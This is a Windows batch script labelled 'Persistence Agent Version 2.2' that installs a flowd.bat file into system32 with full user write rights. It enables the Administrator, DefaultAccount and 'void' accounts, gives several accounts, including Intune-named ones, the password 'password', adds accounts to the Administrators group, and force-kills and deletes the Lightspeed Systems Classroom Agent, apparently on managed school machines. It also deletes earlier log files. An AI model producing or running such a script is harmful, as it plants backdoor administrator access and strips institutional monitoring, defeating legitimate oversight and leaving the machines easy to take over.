@ECHO OFF

echo Clearing Previous Logs
del C:\Windows\system32\Logs\Log*.txt
del C:\Windows\system32\Logs\flowdLogs.txt

echo Persistence Agent Version 2.2 > C:\Windows\system32\Logs\Log1.txt

echo Waiting for full system startup and clearing logs... > C:\Windows\system32\Logs\Log2.txt
timeout /t 5

echo Update Application > C:\Windows\system32\Logs\Log3.txt
xcopy D:\flowd.bat C:\Windows\system32\flowd.bat /y
xcopy "D:\Programs\Tools for flowd\flowd.bat" C:\Windows\system32\flowd.bat /y
icacls "C:\Windows\system32\flowd.bat" /grant Users:F

echo User Repair > C:\Windows\system32\Logs\Log4.txt
net user "INTUNEadmin" password
net user "IntuneAdmin" password
net localgroup Administrators test /add
net user Administrator /active:yes
net user Administrator password
net user void /active:yes
net user void password
net user DefaultAccount /active:yes
net localgroup Administrators DefaultAccount /add
net user compassAuth password

echo Process Repair and Cleanup > C:\Windows\system32\Logs\Log5.txt
taskkill /f /im CW_Svc_Service.exe
taskkill /f /im ClassroomWindows.exe
rd /s /q "C:\Program Files\Lightspeed Systems\Classroom Agent"
rd /s /q "C:\ProgramData\Lightspeed Systems\Classroom Agent"

echo Logging Information...
copy C:\Windows\system32\Logs\Log*.txt C:\Windows\system32\Logs\flowdLogs.txt
del C:\Windows\system32\Logs\Log*.txt

exit